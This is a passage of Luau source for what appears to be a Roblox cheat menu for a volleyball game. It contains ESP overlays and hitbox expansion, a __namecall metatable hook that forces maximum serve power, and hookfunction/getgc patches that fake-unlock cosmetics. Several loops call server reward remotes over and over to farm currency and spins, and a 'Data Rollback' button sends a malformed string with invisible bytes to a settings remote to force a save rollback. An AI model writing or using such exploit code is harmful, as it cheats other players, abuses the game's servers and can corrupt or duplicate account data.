    frame.BackgroundTransparency = 0.6
    frame.BorderSizePixel = 0
    frame.Parent = gui
    local deviceLabel = Instance.new("TextLabel")
    deviceLabel.Size = UDim2.new(1, 0, 0, 18)
    deviceLabel.BackgroundTransparency = 1
    deviceLabel.Text = player:GetAttribute("User_InputType") or "N/A"
    deviceLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    deviceLabel.TextScaled = true
    deviceLabel.Font = Enum.Font.GothamBold
    deviceLabel.Parent = frame
    local styleLabel = Instance.new("TextLabel")
    styleLabel.Size = UDim2.new(1, 0, 0, 18)
    styleLabel.BackgroundTransparency = 1
    styleLabel.Text = player:GetAttribute("Gameplay_Style") or "N/A"
    styleLabel.TextColor3 = Color3.fromRGB(255, 200, 0)
    styleLabel.TextScaled = true
    styleLabel.Font = Enum.Font.GothamBold
    styleLabel.Parent = frame
    local abilityLabel = Instance.new("TextLabel")
    abilityLabel.Size = UDim2.new(1, 0, 0, 18)
    abilityLabel.BackgroundTransparency = 1
    abilityLabel.Text = player:GetAttribute("Gameplay_Ability") or "N/A"
    abilityLabel.TextColor3 = Color3.fromRGB(0, 200, 255)
    abilityLabel.TextScaled = true
    abilityLabel.Font = Enum.Font.GothamBold
    abilityLabel.Parent = frame
    local levelLabel = Instance.new("TextLabel")
    levelLabel.Size = UDim2.new(1, 0, 0, 18)
    levelLabel.BackgroundTransparency = 1
    levelLabel.Text = player:GetAttribute("User_Level") or "N/A"
    levelLabel.TextColor3 = Color3.fromRGB(0, 255, 100)
    levelLabel.TextScaled = true
    levelLabel.Font = Enum.Font.GothamBold
    levelLabel.Parent = frame
    local connection = player.AttributeChanged:Connect(function(attr)
        if attr == "User_InputType" then
            deviceLabel.Text = player:GetAttribute("User_InputType") or "N/A"
        elseif attr == "Gameplay_Style" then
            styleLabel.Text = player:GetAttribute("Gameplay_Style") or "N/A"
        elseif attr == "Gameplay_Ability" then
            abilityLabel.Text = player:GetAttribute("Gameplay_Ability") or "N/A"
        elseif attr == "User_Level" then
            levelLabel.Text = player:GetAttribute("User_Level") or "N/A"
        end
    end)
    espPlayers[player] = {
        GUI = gui,
        Connection = connection
    }
end

local function removeESP2(player)
    if espPlayers[player] then
        if espPlayers[player].GUI then
            espPlayers[player].GUI:Destroy()
        end
        if espPlayers[player].Connection then
            espPlayers[player].Connection:Disconnect()
        end
        espPlayers[player] = nil
    end
end

local function startAutoSpin()
    coroutine.wrap(function()
        while autoSpin do
            local currentStyle = LocalPlayer.PlayerGui.Interface.Lobby.Styles.TopPanel.DisplayName.Text
            for _, style in ipairs(desiredStyles) do
                if currentStyle == style then
                    autoSpin = false
                    Window:Notify({ Title = "Style Obtained", Content = currentStyle, Duration = 4 })
                    return
                end
            end
            local args = { [1] = (spinType == "Lucky") }
            local StyleService = ReplicatedStorage.Packages._Index["sleitnick_knit@1.7.0"].knit.Services.StyleService
            if StyleService then
                local RF = StyleService:FindFirstChild("RF")
                if RF then
                    local Roll = RF:FindFirstChild("Roll")
                    if Roll then
                        Roll:InvokeServer(unpack(args))
                    end
                end
            end
            task.wait(0)
        end
    end)()
end

local function startAutoAbilitySpin()
    coroutine.wrap(function()
        while autoAbilitySpin do
            local currentAbility = LocalPlayer.PlayerGui.Interface.Lobby.Abilities.TopPanel.DisplayName.Text
            for _, ability in ipairs(desiredAbilities) do
                if currentAbility == ability then
                    autoAbilitySpin = false
                    Window:Notify({ Title = "Ability Obtained", Content = currentAbility, Duration = 4 })
                    return
                end
            end
            local args = { [1] = (abilitySpinType == "Lucky") }
            local AbilityService = ReplicatedStorage.Packages._Index["sleitnick_knit@1.7.0"].knit.Services.AbilityService
            if AbilityService then
                local RF = AbilityService:FindFirstChild("RF")
                if RF then
                    local Roll = RF:FindFirstChild("Roll")
                    if Roll then
                        Roll:InvokeServer(unpack(args))
                    end
                end
            end
            task.wait(0)
        end
    end)()
end

local function startInfiniteLucky()
    coroutine.wrap(function()
        while infiniteLuckyEnabled do
            local SeasonService = ReplicatedStorage.Packages._Index["sleitnick_knit@1.7.0"].knit.Services.SeasonService
            if SeasonService then
                local RF = SeasonService:FindFirstChild("RF")
                if RF then
                    local RequestRankedReward = RF:FindFirstChild("RequestRankedReward")
                    if RequestRankedReward then
                        RequestRankedReward:InvokeServer(1)
                    end
                end
            end
            task.wait(autoSpinDelay)
        end
    end)()
end

local function enableHitEffect()
    if hitConnection then return end
    hasFired = false
    isLocalHit = false
    local Remote = ReplicatedStorage.Packages._Index["sleitnick_knit@1.7.0"].knit.Services.BallService.RE.HitGround
    Remote.OnClientEvent:Connect(function(...)
        local args = {...}
        local myName = LocalPlayer.Name
        for _, val in pairs(args) do
            if tostring(val) == myName then
                isLocalHit = true
                break
            end
        end
    end)
    local function fireHitRemote(hitPos)
        if hasFired then return end
        if not isLocalHit then return end
        if not hitEffectEnabled then return end
        hasFired = true
        local myUsername = LocalPlayer.Name
        local targetObject = workspace:FindFirstChild(myUsername) or workspace:FindFirstChild("uwuwuwiiwuw6")
        if firesignal then
            firesignal(Remote.OnClientEvent, table.unpack({
                hitPos,
                true,
                false,
                5,
                selectedEffect,
                targetObject,
                Vector3.new(-0.000002088591600113432, 1, -0.000004710930170404026)
            }))
        end
        task.wait(0.5)
        hasFired = false
        isLocalHit = false
    end
    hitConnection = workspace.ChildAdded:Connect(function(child)
        if child.Name == "HitIndicator" then
            if child.Color == Color3.fromRGB(0, 255, 0) then
                fireHitRemote(child.Position)
            end
        end
    end)
    hitConnection2 = workspace.DescendantAdded:Connect(function(child)
        if child.Name == "HitIndicator" and child:IsA("BasePart") then
            if child.Color == Color3.fromRGB(0, 255, 0) then
                fireHitRemote(child.Position)
            end
        end
    end)
    hitRemovedConnection = workspace.DescendantRemoving:Connect(function(child)
        if child.Name == "HitIndicator" then
            hasFired = false
            isLocalHit = false
        end
    end)
end

local function disableHitEffect()
    if hitConnection then
        hitConnection:Disconnect()
        hitConnection = nil
    end
    if hitConnection2 then
        hitConnection2:Disconnect()
        hitConnection2 = nil
    end
    if hitRemovedConnection then
        hitRemovedConnection:Disconnect()
        hitRemovedConnection = nil
    end
    hasFired = false
    isLocalHit = false
end

local function fireCardRemote()
    if hasFiredCard then return end
    if not playerCardEnabled then return end
    local Remote = ReplicatedStorage.Packages._Index["sleitnick_knit@1.7.0"].knit.Services.PlayerCardService.RE.OnFlashCard
    if not Remote then return end
    hasFiredCard = true
    if firesignal then
        firesignal(Remote.OnClientEvent, {
            ["PlayerCardItemId"] = selectedCard,
            ["Context"] = {
                ["Custom"] = {
                },
                ["PlacementId"] = "ScoredPoint",
            },
            ["Player"] = LocalPlayer,
        })
    end
end

local function resetCard()
    hasFiredCard = false
end

local function handleCardFrame(frame)
    if not frame then return end
    if hasFiredCard then return end
    if not playerCardEnabled then return end
    local playerName = string.upper(LocalPlayer.Name)
    local username = frame:FindFirstChild("Username", true)
    if username and username:IsA("TextLabel") then
        local currentText = string.upper(username.Text or "")
        if string.find(currentText, playerName) then
            frame:Destroy()
            task.wait(0.1)
            fireCardRemote()
            protectPlayerCard()
        end
    end
end

local function enablePlayerCard()
    if cardConnection then return end
    hasFiredCard = false
    local persistent = LocalPlayer.PlayerGui:FindFirstChild("Interface")
    if persistent then
        persistent = persistent:FindFirstChild("Persistent")
        if persistent then
            cardConnection = persistent.ChildAdded:Connect(function(child)
                if child.Name == "FlashPlayerCardFrame" then
                    task.wait(0.3)
                    protectPlayerCard()
                    handleCardFrame(child)
                end
            end)
            cardConnection2 = persistent.DescendantAdded:Connect(function(child)
                if child.Name == "Username" and child:IsA("TextLabel") then
                    task.wait(0.2)
                    local frame = child.Parent
                    while frame and frame.Name ~= "FlashPlayerCardFrame" do
                        frame = frame.Parent
                    end
                    if frame then
                        protectPlayerCard()
                        handleCardFrame(frame)
                    end
                end
            end)
        end
    end
    protectPlayerCard()
end

local function disablePlayerCard()
    if cardConnection then
        cardConnection:Disconnect()
        cardConnection = nil
    end
    if cardConnection2 then
        cardConnection2:Disconnect()
        cardConnection2 = nil
    end
    hasFiredCard = false
end

local function enableMaxServe()
    if maxServeHookActive then return end
    mtMaxServe = getrawmetatable(game)
    oldNamecallMaxServe = mtMaxServe.__namecall
    setreadonly(mtMaxServe, false)
    mtMaxServe.__namecall = function(self, ...)
        local method = getnamecallmethod()
        local args = {...}
        if self == Serve and method == "InvokeServer" then
            args[2] = 5
            return oldNamecallMaxServe(self, unpack(args))
        end
        return oldNamecallMaxServe(self, ...)
    end
    setreadonly(mtMaxServe, true)
    maxServeHookActive = true
    maxServeEnabled = true
end

local function disableMaxServe()
    if not maxServeHookActive then return end
    if mtMaxServe and oldNamecallMaxServe then
        setreadonly(mtMaxServe, false)
        mtMaxServe.__namecall = oldNamecallMaxServe
        setreadonly(mtMaxServe, true)
    end
    maxServeHookActive = false
    maxServeEnabled = false
    oldNamecallMaxServe = nil
    mtMaxServe = nil
end

local function createLeadFeetButton()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "LeadFeetGUI"
    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    leadFeetButton = Instance.new("TextButton")
    leadFeetButton.Size = UDim2.new(0, 50, 0, 50)
    leadFeetButton.Position = UDim2.new(0.25, -25, 0.8, -25)
    leadFeetButton.BackgroundColor3 = Color3.fromRGB(0, 255, 200)
    leadFeetButton.Text = "LF"
    leadFeetButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    leadFeetButton.TextScaled = true
    leadFeetButton.Font = Enum.Font.GothamBold
    leadFeetButton.Parent = screenGui
    leadFeetButton.BackgroundTransparency = 0.2
    leadFeetButton.BorderSizePixel = 0
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(1, 0)
    corner.Parent = leadFeetButton
    local dragging = false
    local dragStart = nil
    local startPos = nil
    leadFeetButton.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = leadFeetButton.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    leadFeetButton.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            leadFeetButton.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    leadFeetButton.MouseButton1Click:Connect(function()
        if leadFeetEnabled then
            local character = LocalPlayer.Character
            if not character then return end
            local hrp = character:FindFirstChild("HumanoidRootPart")
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            if not hrp or not humanoid or humanoid.Health <= 0 then return end
            local params = RaycastParams.new()
            params.FilterDescendantsInstances = {character}
            params.FilterType = Enum.RaycastFilterType.Blacklist
            local result = workspace:Raycast(hrp.Position, Vector3.new(0, -1000, 0), params)
            if result then
                local altura = humanoid.HipHeight + 0.2
                local newPos = Vector3.new(hrp.Position.X, result.Position.Y + altura, hrp.Position.Z)
                hrp.CFrame = CFrame.new(newPos) * (hrp.CFrame - hrp.CFrame.Position)
                hrp.AssemblyLinearVelocity = Vector3.zero
                hrp.AssemblyAngularVelocity = Vector3.zero
                humanoid:ChangeState(Enum.HumanoidStateType.Landing)
            end
        end
    end)
    leadFeetButton.Visible = false
    return leadFeetButton
end

createLeadFeetButton()

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.R then
        if leadFeetEnabled then
            local character = LocalPlayer.Character
            if not character then return end
            local hrp = character:FindFirstChild("HumanoidRootPart")
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            if not hrp or not humanoid or humanoid.Health <= 0 then return end
            local params = RaycastParams.new()
            params.FilterDescendantsInstances = {character}
            params.FilterType = Enum.RaycastFilterType.Blacklist
            local result = workspace:Raycast(hrp.Position, Vector3.new(0, -1000, 0), params)
            if result then
                local altura = humanoid.HipHeight + 0.2
                local newPos = Vector3.new(hrp.Position.X, result.Position.Y + altura, hrp.Position.Z)
                hrp.CFrame = CFrame.new(newPos) * (hrp.CFrame - hrp.CFrame.Position)
                hrp.AssemblyLinearVelocity = Vector3.zero
                hrp.AssemblyAngularVelocity = Vector3.zero
                humanoid:ChangeState(Enum.HumanoidStateType.Landing)
            end
        end
    end
end)

local MainTab = Window:AddTab({ Name = "Main", Icon = "crosshairs", Type = "Double" })

local L = MainTab:AddSection({ Name = "SPIKE SETTINGS", Position = "Center" })
local R = MainTab:AddSection({ Name = "HITBOX SETTINGS", Position = "Center" })
local C1 = MainTab:AddSection({ Name = "PERFORMANCE", Position = "Center" })
local C2 = MainTab:AddSection({ Name = "MOVEMENT", Position = "Center" })
local C3 = MainTab:AddSection({ Name = "VISUAL", Position = "Center" })
local C4 = MainTab:AddSection({ Name = "MAX SERVE", Position = "Center" })
local C5 = MainTab:AddSection({ Name = "DATA", Position = "Center" })

L:AddToggle({ Name = "Silent Spike", Default = false, Flag = "silentspike", Callback = function(v) 
    silentSpikeEnabled = v
    if spikeButton then
        spikeButton.Visible = v
    end
end })

L:AddToggle({ Name = "Redirect Spike", Default = false, Flag = "redirectspike", Callback = function(v) 
    if v then
        enableRedirectSpike()
    else
        disableRedirectSpike()
    end
end })

L:AddToggle({ Name = "New Silent Spike", Default = false, Flag = "newspike", Callback = function(v) 
    newSilentSpikeEnabled = v
    if newSpikeButton then
        newSpikeButton.Visible = v
    end
end })

L:AddToggle({ Name = "Sanju Tilt", Default = false, Flag = "sanju", Callback = function(v) 
    if v then
        enableSanjuTilt()
    else
        disableSanjuTilt()
    end
end })

L:AddToggle({ Name = "Max Charge Special", Default = false, Flag = "maxcharge", Callback = function(v) 
    if v then
        enableMaxCharge()
    else
        disableMaxCharge()
    end
end })

R:AddSlider({ Name = "Hitbox Size", Default = 5, Min = 0, Max = 20, Flag = "hitboxsize", Callback = function(v) 
    hitboxScale = v
    updateHitboxes(v)
end })

R:AddDropdown({ Name = "Hitbox Color", Values = {"Green", "Blue", "Red", "Yellow", "Purple", "Orange", "Pink", "White"}, Default = "Green", Flag = "hitboxcolor", Callback = function(v) 
    local colors = {
        Green = Color3.fromRGB(0, 255, 0),
        Blue = Color3.fromRGB(0, 0, 255),
        Red = Color3.fromRGB(255, 0, 0),
        Yellow = Color3.fromRGB(255, 255, 0),
        Purple = Color3.fromRGB(128, 0, 128),
        Orange = Color3.fromRGB(255, 165, 0),
        Pink = Color3.fromRGB(255, 105, 180),
        White = Color3.fromRGB(255, 255, 255)
    }
    hitboxColor = colors[v] or Color3.fromRGB(0, 255, 0)
    hitboxColorName = v
    updateHitboxes(hitboxScale)
end })

R:AddButton({ Name = "Remove Hitboxes", Callback = function()
    removeHitboxes()
    Window:Notify({ Title = "Hitboxes Removed", Content = "All hitboxes cleared", Duration = 2 })
end })

R:AddButton({ Name = "Show Stop Ball", Callback = function()
    stopBallVisible = not stopBallVisible
    if stopBallButton then
        stopBallButton.Visible = stopBallVisible
    else
        stopBallButton = createStopBallButton()
    end
    Window:Notify({ Title = "Stop Ball", Content = stopBallVisible and "SHOWN" or "HIDDEN", Duration = 2 })
end })

R:AddButton({ Name = "Show Aim", Callback = function()
    aimVisible = not aimVisible
    if aimButton then
        aimButton.Visible = aimVisible
    else
        aimButton = createAimButton()
    end
    Window:Notify({ Title = "Aim", Content = aimVisible and "SHOWN" or "HIDDEN", Duration = 2 })
end })

C1:AddToggle({ Name = "Anti-Lag", Default = false, Flag = "antilag", Callback = function(v) 
    if v then
        pcall(function()
            local GraphicsQuality = tonumber(game:GetEngineStats().GraphicsQuality)
            if GraphicsQuality and GraphicsQuality > 3 then
                game:SetGraphicsQuality(3)
            end
            if Lighting:FindFirstChild("BloomEffect") then Lighting.BloomEffect.Enabled = false end
            if Lighting:FindFirstChild("BlurEffect") then Lighting.BlurEffect.Enabled = false end
            if Lighting:FindFirstChild("SunRaysEffect") then Lighting.SunRaysEffect.Enabled = false end
            Lighting.ShadowSoftness = 1.5
            Lighting.ShadowsEnabled = false
            Lighting.GlobalShadows = false
            settings().Rendering.QualityLevel = 1
            settings().Rendering.ShadowQuality = 0
        end)
        Window:Notify({ Title = "Anti-Lag", Content = "ENABLED", Duration = 2 })
    else
        pcall(function()
            settings().Rendering.QualityLevel = 3
            settings().Rendering.ShadowQuality = 2
            Lighting.ShadowsEnabled = true
            Lighting.GlobalShadows = true
            if Lighting:FindFirstChild("BloomEffect") then Lighting.BloomEffect.Enabled = true end
            if Lighting:FindFirstChild("BlurEffect") then Lighting.BlurEffect.Enabled = true end
            if Lighting:FindFirstChild("SunRaysEffect") then Lighting.SunRaysEffect.Enabled = true end
        end)
        Window:Notify({ Title = "Anti-Lag", Content = "DISABLED", Duration = 2 })
    end
end })

C2:AddToggle({ Name = "Desync", Default = false, Flag = "desync", Callback = function(v) 
    if v then
        enableDesync()
        Window:Notify({ Title = "Desync", Content = "ENABLED", Duration = 2 })
    else
        disableDesync()
        Window:Notify({ Title = "Desync", Content = "DISABLED", Duration = 2 })
    end
end })

C2:AddToggle({ Name = "Auto Receive", Default = false, Flag = "autoreceive", Callback = function(v) 
    if v then
        enableAutoReceive()
        Window:Notify({ Title = "Auto Receive", Content = "ENABLED", Duration = 2 })
    else
        disableAutoReceive()
        Window:Notify({ Title = "Auto Receive", Content = "DISABLED", Duration = 2 })
    end
end })

C2:AddToggle({ Name = "Akari Dash", Default = false, Flag = "akaridash", Callback = function(v) 
    akariDashEnabled = v
    if dashButton then
        dashButton.Visible = v
    end
    if v then
        Window:Notify({ Title = "Akari Dash", Content = "ENABLED", Duration = 2 })
    else
        Window:Notify({ Title = "Akari Dash", Content = "DISABLED", Duration = 2 })
    end
end })

C3:AddToggle({ Name = "ScoreEffect Changer", Default = false, Flag = "scoreeffect", Callback = function(v) 
    hitEffectEnabled = v
    if v then
        enableHitEffect()
        Window:Notify({ Title = "ScoreEffect Changer", Content = "ENABLED", Duration = 2 })
    else
        disableHitEffect()
        Window:Notify({ Title = "ScoreEffect Changer", Content = "DISABLED", Duration = 2 })
    end
end })

C3:AddDropdown({ Name = "Effect Select", Values = effectList, Default = effectList[1] or "No Effects Found", Flag = "effectselect", Callback = function(v) 
    selectedEffect = v
    Window:Notify({ Title = "Effect Changed", Content = "Set to " .. v, Duration = 2 })
end })

C3:AddToggle({ Name = "PlayerCard Changer", Default = false, Flag = "playercard", Callback = function(v) 
    playerCardEnabled = v
    if v then
        enablePlayerCard()
        Window:Notify({ Title = "PlayerCard Changer", Content = "ENABLED", Duration = 2 })
    else
        disablePlayerCard()
        Window:Notify({ Title = "PlayerCard Changer", Content = "DISABLED", Duration = 2 })
    end
end })

C3:AddDropdown({ Name = "Card Select", Values = cardList, Default = cardList[1] or "No Cards Found", Flag = "cardselect", Callback = function(v) 
    selectedCard = v
    Window:Notify({ Title = "Card Changed", Content = "Set to " .. v, Duration = 2 })
end })

C3:AddButton({ Name = "Unlock All Ball", Callback = function()
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local Item = require(ReplicatedStorage.Content.Item)
    local Knit = require(ReplicatedStorage.Packages.Knit)
    local InventoryController = Knit.GetController("InventoryController")
    local InventoryService = Knit.GetService("InventoryService")
    local InventoryValue = InventoryController.Inventory
    local inv = InventoryValue:get()
    local isEquipped = require(game.ReplicatedFirst.Controllers.InventoryController.IsEquipped)
    local toggled = {}
    local Items = {}
    local allBalls = Item:GetAllFromType(Item.Type.Ball)
    for _, ball in pairs(allBalls) do
        Items[ball.Id] = true
        inv[ball.Id] = 1
    end
    InventoryValue:set(inv)
    local old3
    old3 = hookfunction(isEquipped, function(item, equippedTable, selected)
        if Items[selected] and toggled[selected] ~= nil then
            return toggled[selected]
        end
        return old3(item, equippedTable, selected)
    end)
    local old2
    old2 = hookfunction(InventoryService.Equip, function(self, id)
        local result = old2(self, id)
        if Items[id] then
            for k, _ in pairs(toggled) do
                toggled[k] = nil
            end
            toggled[id] = true
            local eq = InventoryController.Equipped:get()
            InventoryController.Equipped:set(eq)
        end
        return result
    end)
    local fakeEntries = {}
    for _, ball in pairs(allBalls) do
        table.insert(fakeEntries, {Name = ball.Id, Item = ball, Count = 1, IsRandom = false})
    end
    for _, func in getgc() do
        if typeof(func) == "function" then
            if tostring(getfenv(func).script) == "buildEntries" then
                if debug.info(func, "l") == 23 then
                    local old
                    old = hookfunction(func, function(p1, p2)
                        if p1.ItemType == Item.Type.Ball then
                            return fakeEntries
                        end
                        return old(p1, p2)
                    end)
                end
            end
            if tostring(getfenv(func).script) == "BallController" then
                if debug.info(func, "l") == 62 then
                    local old4
                    old4 = hookfunction(func, function(p1)
                        if not workspace:FindFirstChild("CLIENT_BALL_" .. p1.ID) and p1.Skin then
                            for name, isToggled in pairs(toggled) do
                                if isToggled then
                                    p1.Skin = name
                                    break
                                end
                            end
                        end
                        return old4(p1)
                    end)
                end
            end
        end
    end
    Window:Notify({ Title = "Unlock All Ball", Content = "All balls unlocked!", Duration = 2 })
end })

C3:AddToggle({ Name = "ESP", Default = false, Flag = "esp", Callback = function(v) 
    espEnabled = v
    if v then
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                task.spawn(createESP, player)
            end
        end
        Players.PlayerAdded:Connect(function(player)
            task.spawn(createESP, player)
        end)
    else
        for player in pairs(espPlayers) do
            removeESP2(player)
        end
    end
end })

C4:AddToggle({ Name = "Max Serve", Default = false, Flag = "maxserve", Callback = function(v) 
    if v then
        enableMaxServe()
        Window:Notify({ Title = "Max Serve", Content = "ENABLED", Duration = 2 })
    else
        disableMaxServe()
        Window:Notify({ Title = "Max Serve", Content = "DISABLED", Duration = 2 })
    end
end })

C4:AddToggle({ Name = "Lead Feet", Default = false, Flag = "leadfeet", Callback = function(v) 
    leadFeetEnabled = v
    if leadFeetButton then
        leadFeetButton.Visible = v
    end
    if v then
        Window:Notify({ Title = "Lead Feet", Content = "ENABLED", Duration = 2 })
    else
        Window:Notify({ Title = "Lead Feet", Content = "DISABLED", Duration = 2 })
    end
end })

C5:AddButton({ Name = "Data Rollback", Callback = function()
    local Remote = game:GetService("ReplicatedStorage")
        :WaitForChild("Packages")
        :WaitForChild("_Index")
        :WaitForChild("sleitnick_knit@1.7.0")
        :WaitForChild("knit")
        :WaitForChild("Services")
        :WaitForChild("SettingsService")
        :WaitForChild("RF")
        :WaitForChild("UpdateKeybind")
    Remote:InvokeServer("MouseButton1", true, "Spike\xE2\x80\x8B\x8F")
    Window:Notify({ Title = "Data Rollback", Content = "Executed! Rejoining...", Duration = 2 })
    game:GetService("TeleportService"):Teleport(game.PlaceId)
end })

local CharacterTab = Window:AddTab({ Name = "Character", Icon = "user", Type = "Double" })

local CL = CharacterTab:AddSection({ Name = "ATTRIBUTES", Position = "Center" })
local CR = CharacterTab:AddSection({ Name = "MOVEMENT", Position = "Center" })

CL:AddInput({ Name = "Dive Speed", Placeholder = "0.95", Flag = "divespeed", Callback = function(v) 
    local num = tonumber(v)
    if num then
        LocalPlayer:SetAttribute("Multiplier_DiveSpeed", num)
    end
end })

CL:AddInput({ Name = "Jump Power", Placeholder = "1.1", Flag = "jumppower", Callback = function(v) 
    local num = tonumber(v)
    if num then
        LocalPlayer:SetAttribute("Multiplier_JumpPower", num)
    end
end })

CL:AddInput({ Name = "Speed", Placeholder = "0.85", Flag = "speed", Callback = function(v) 
    local num = tonumber(v)
    if num then
        LocalPlayer:SetAttribute("Multiplier_Speed", num)
    end
end })

CR:AddToggle({ Name = "Air Movement", Default = false, Flag = "airmove", Callback = function(v) 
    airMovement = v
    if not v and bodyVelocity then
        bodyVelocity:Destroy()
        bodyVelocity = nil
    end
end })

CR:AddSlider({ Name = "Air Movement Speed", Default = 16, Min = 0, Max = 100, Flag = "airspeed", Callback = function(v) 
    airMovementSpeed = v
end })

CR:AddToggle({ Name = "Auto Shift Lock", Default = false, Flag = "autoshiftlock", Callback = function(v)
    autoShiftLock = v
    if v then
        local character = LocalPlayer.Character
        if character then
            local humanoid = character:FindFirstChild("Humanoid")
            if humanoid then
                humanoid.AutoRotate = false
            end
        end
        Window:Notify({ Title = "Auto Shift Lock", Content = "ENABLED", Duration = 2 })
    else
        local character = LocalPlayer.Character
        if character then
            local humanoid = character:FindFirstChild("Humanoid")
            if humanoid then
                humanoid.AutoRotate = true
            end
        end
        Window:Notify({ Title = "Auto Shift Lock", Content = "DISABLED", Duration = 2 })
    end
end })

local function setupCharacter(character)
    local humanoid = character:WaitForChild("Humanoid")
    local rootPart = character:WaitForChild("HumanoidRootPart")
    humanoid:GetPropertyChangedSignal("Jump"):Connect(function()
        if humanoid.Jump then
            if autoShiftLock then
                task.defer(function()
                    task.wait(0.03)
                    local lookVector = Vector3.new(Camera.CFrame.LookVector.X, 0, Camera.CFrame.LookVector.Z)
                    if lookVector.Magnitude > 0 then
                        rootPart.CFrame = CFrame.lookAt(rootPart.Position, rootPart.Position + lookVector.Unit)
                        humanoid.AutoRotate = false
                    end
                end)
            else
                humanoid.AutoRotate = true
            end
        end
    end)
end

if LocalPlayer.Character then
    setupCharacter(LocalPlayer.Character)
end
LocalPlayer.CharacterAdded:Connect(setupCharacter)

local VisualTab = Window:AddTab({ Name = "Visuals", Icon = "eye", Type = "Double" })

local VL = VisualTab:AddSection({ Name = "ESP", Position = "Center" })
local VR = VisualTab:AddSection({ Name = "CAMERA", Position = "Center" })

VL:AddToggle({ Name = "ESP (Jump)", Default = false, Flag = "espjump", Callback = function(v) 
    espJumpEnabled = v
    if not v then
        for player in pairs(espHighlights) do
            removeESP(player)
        end
    end
end })

VR:AddSlider({ Name = "POV", Default = 70, Min = 1, Max = 120, Flag = "pov", Callback = function(v) 
    workspace.CurrentCamera.FieldOfView = v
end })

VR:AddButton({ Name = "Rejoin", Callback = function()
    TeleportService:Teleport(game.PlaceId)
end })

local MiscTab = Window:AddTab({ Name = "Misc", Icon = "settings", Type = "Double" })

local ML = MiscTab:AddSection({ Name = "INFINITE LUCKY", Position = "Center" })
local MR = MiscTab:AddSection({ Name = "SHOP", Position = "Center" })
local MC1 = MiscTab:AddSection({ Name = "AUTO STYLE SPIN", Position = "Center" })
local MC2 = MiscTab:AddSection({ Name = "AUTO ABILITY SPIN", Position = "Center" })
local MC3 = MiscTab:AddSection({ Name = "CLAIM REWARDS", Position = "Center" })

ML:AddToggle({ Name = "Style", Default = false, Flag = "infinitelucky", Callback = function(v) 
    infiniteLuckyEnabled = v
    if v then
        if infiniteLuckyConnection then return end
        infiniteLuckyConnection = task.spawn(function()
            local SeasonService = ReplicatedStorage.Packages._Index["sleitnick_knit@1.7.0"].knit.Services.SeasonService
            while infiniteLuckyEnabled do
                if SeasonService then
                    local RF = SeasonService:FindFirstChild("RF")
                    if RF then
                        local RequestRankedReward = RF:FindFirstChild("RequestRankedReward")
                        if RequestRankedReward then
                            RequestRankedReward:InvokeServer(1)
                        end
                    end
                end
                task.wait(autoSpinDelay)
            end
        end)
        Window:Notify({ Title = "Infinite Lucky", Content = "ENABLED", Duration = 2 })
    else
        if infiniteLuckyConnection then
            task.cancel(infiniteLuckyConnection)
            infiniteLuckyConnection = nil
        end
        Window:Notify({ Title = "Infinite Lucky", Content = "DISABLED", Duration = 2 })
    end
end })

ML:AddToggle({ Name = "Yen", Default = false, Flag = "yen", Callback = function(v) 
    autoYen = v
    if v then
        if yenConnection then return end
        yenConnection = task.spawn(function()
            local SeasonService = ReplicatedStorage.Packages._Index["sleitnick_knit@1.7.0"].knit.Services.SeasonService
            while autoYen do
                if SeasonService then
                    local RF = SeasonService:FindFirstChild("RF")
                    if RF then
                        local RequestRankedReward = RF:FindFirstChild("RequestRankedReward")
                        if RequestRankedReward then
                            RequestRankedReward:InvokeServer(2)
                        end
                    end
                end
                task.wait(autoSpinDelay)
            end
        end)
        Window:Notify({ Title = "Yen", Content = "ENABLED", Duration = 2 })
    else
        if yenConnection then
            task.cancel(yenConnection)
            yenConnection = nil
        end
        Window:Notify({ Title = "Yen", Content = "DISABLED", Duration = 2 })
    end
end })

ML:AddToggle({ Name = "Ability", Default = false, Flag = "ability", Callback = function(v) 
    autoAbility = v
    if v then
        if abilityConnection then return end
        abilityConnection = task.spawn(function()
            local SeasonService = ReplicatedStorage.Packages._Index["sleitnick_knit@1.7.0"].knit.Services.SeasonService
            while autoAbility do
                if SeasonService then
                    local RF = SeasonService:FindFirstChild("RF")
                    if RF then
                        local RequestRankedReward = RF:FindFirstChild("RequestRankedReward")
                        if RequestRankedReward then
                            RequestRankedReward:InvokeServer(4)
                        end
                    end
                end
                task.wait(autoSpinDelay)
            end
        end)
        Window:Notify({ Title = "Ability", Content = "ENABLED", Duration = 2 })
    else
        if abilityConnection then
            task.cancel(abilityConnection)
            abilityConnection = nil
        end
        Window:Notify({ Title = "Ability", Content = "DISABLED", Duration = 2 })
    end
end })

ML:AddToggle({ Name = "Normal Spin", Default = false, Flag = "normalspin", Callback = function(v) 
    autoNormal = v
    if v then
        if normalConnection then return end
        normalConnection = task.spawn(function()
            local SeasonService = ReplicatedStorage.Packages._Index["sleitnick_knit@1.7.0"].knit.Services.SeasonService
            while autoNormal do
                if SeasonService then
                    local RF = SeasonService:FindFirstChild("RF")
                    if RF then
                        local RequestRankedReward = RF:FindFirstChild("RequestRankedReward")
                        if RequestRankedReward then
                            RequestRankedReward:InvokeServer(5)
                        end
                    end
                end
                task.wait(autoSpinDelay)
            end
        end)
        Window:Notify({ Title = "Normal Spin", Content = "ENABLED", Duration = 2 })
    else
        if normalConnection then
            task.cancel(normalConnection)
            normalConnection = nil
        end
        Window:Notify({ Title = "Normal Spin", Content = "DISABLED", Duration = 2 })
    end
end })

